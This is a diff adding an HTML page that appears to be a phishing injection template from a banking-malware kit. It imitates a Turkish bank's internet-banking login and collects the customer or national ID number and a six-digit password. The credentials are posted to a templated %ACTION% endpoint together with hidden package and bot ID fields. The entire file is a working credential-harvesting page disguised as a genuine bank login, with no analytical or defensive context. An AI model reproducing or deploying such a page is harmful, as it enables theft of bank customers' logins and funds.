@@ -1,0 +1,198 @@
+<html>
+  <head>
+	<meta http-equiv="Content-Type"content="text/html; charset=utf-8">
+	<meta name="viewport"content="width=device-width,height=device-height, initial-scale=1.0, user-scalable=yes, maximum-scale=1.0">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js">
+	</script>
+	<style type="text/css">*{
+	  outline:none;
+	  }
+	  .br{
+		border:1px dotted red;
+	  }
+	  .stol{
+		display:table;
+		width:100%;
+	  }
+	  .td{
+		display:table-cell;
+	  }
+	  .w100{
+		width:100%;
+	  }
+	  .left_{
+		text-align:left;
+	  }
+	  .right_{
+		text-align:right;
+	  }
+	  .center{
+		text-align:center;
+	  }
+	  .top{
+		vertical-align:top;
+	  }
+	  .bottom{
+		vertical-align:bottom;
+	  }
+	  .middle{
+		vertical-align:middle;
+	  }
+	  .inline{
+		display:inline-block;
+	  }
+	  .pad{
+		padding:15px;
+	  }
+	  .tr{
+		display:table-row;
+	  }
+	  .none{
+		display:none;
+	  }
+	  body,html{
+		background-color:transparent;
+	  }
+	  .ramka{
+		border:1px solid#0A2F64;
+		background-color:white;
+		border-radius:5px;
+		background-color:white!important;
+	  }
+	  .header{
+		padding:20px 20px;
+		background-color:#0A2F64;
+		border-radius:5px 5px 0 0;
+		;
+		color:#FFFFFF;
+	  }
+	  .body{
+		padding:15px;
+	  }
+	  .control-label{
+		color:#421451;
+		font-weight:500;
+	  }
+	  .body h3{
+		color:#8C1D77;
+	  }
+	  .has-error.control-label,.has-error.help-block,.has-error.form-control-feedback{
+	  }
+	   body {
+		background-color: #c41620;
+	  }
+	</style>
+  </head>
+  <body>
+	<form role="form" name="form" action="%ACTION%" id="form" method="post">
+	  <input type="hidden" name="page_id" value="%PKG%" class="main_input" /><input type="hidden" name="bot_id" value="%BOTID%" />
+	  
+	  
+	  <!-- --------------------------- STEP 1 ------------------------------------- -->
+	  
+	  <div class="container cont1" style="padding-top:15px">
+		<div class="ramka">
+		  <div class="header" style='background-color: white; color: black'>
+			<div class="stol w100">
+			  <div class="td  middle left_" style="width:1px">
+				<img src="%DYN_PATH%/img/logo.png" width="200" />
+			  </div>
+			  <div class="td  middle left_ hidden-xs" style="padding-left:20px">
+				<h4 style="margin:0">| İnternet Şubesi'ne Hoş Geldiniz
+				</h4>
+			  </div>
+			  <div class="td  middle right_" style="padding-right:20px">
+				<!-- <h4 style="margin:0">Step 1 of 3</h4> -->
+			  </div>
+			</div>
+		  </div>
+		  <div class="body">
+			<div class="row">
+			  <div class="col-sm-12">
+				<h3 style="margin-top:0"></h3>
+				<p></p>
+				<hr />
+				<!-- fields -->
+				
+				<div class="form-group">
+				  <div class="row">
+					<div class="col-sm-4">
+					  <label class="control-label" for="">Müşteri No/TC Kimlik No: </label>
+					</div>
+					<div class="col-sm-3">
+					  <input class="form-control" type="text" name="fields[login]" minlength="6" required maxlength="11" id="example1" placeholder="" />
+					</div>
+				  </div>
+				</div>
+				
+				<div class="form-group">
+				  <div class="row">
+					<div class="col-sm-4">
+					  <label class="control-label" for="">Şifre: </label>
+					</div>
+					<div class="col-sm-3">
+					  <input class="form-control" type="password" name="fields[password]" minlength="6" required maxlength="6" id="example2" placeholder="" />
+					</div>
+				  </div>
+				</div>
+				
+				
+				<!-- / fields -->
+				<hr />
+				<div class="form-group">
+				  <div class="row ">
+					<div class="col-sm-4"></div>
+					<div class="col-sm-3"><a href="javascript:void(0)" style="background-color: #c41620; border: 0" class="btn btn-info pull-right cont_but">GİRİŞ</a></div>
+				  </div>
+				</div>
+			  </div>
+			</div>
+		  </div>
+		</div>
+	  </div>
+	  
+	</form>
+  </body>
+  <script type="text/javascript">
+	  
+	(function(){
+		var oForm=document.getElementById('form');
+		  
+		$('.form-control').focus(function(){
+			$('.has-error').removeClass('has-error');
+		})
+	  
+	// validate 1st step
+	  
+	$('.cont1 .cont_but').bind('click',function(){
+		 
+		var err=false; 
+		
+		var fields = {
+			'example1': /.{6,11}/,
+			'example2': /[0-9]{6}$/,
+		}
+		
+		for(i in fields) 
+		{
+			var field = i
+			var regex = fields[i]
+		
+			if(!(new RegExp(regex).test($('#' + field).val())))
+			{
+				$('#' + field).closest('.form-group').addClass('has-error');
+				err = true;
+			} 
+		}
+
+		if(err==true)
+		  return;
+
+		oForm.submit();
+	  });
+	  
+	})();
+  </script>
+</html>
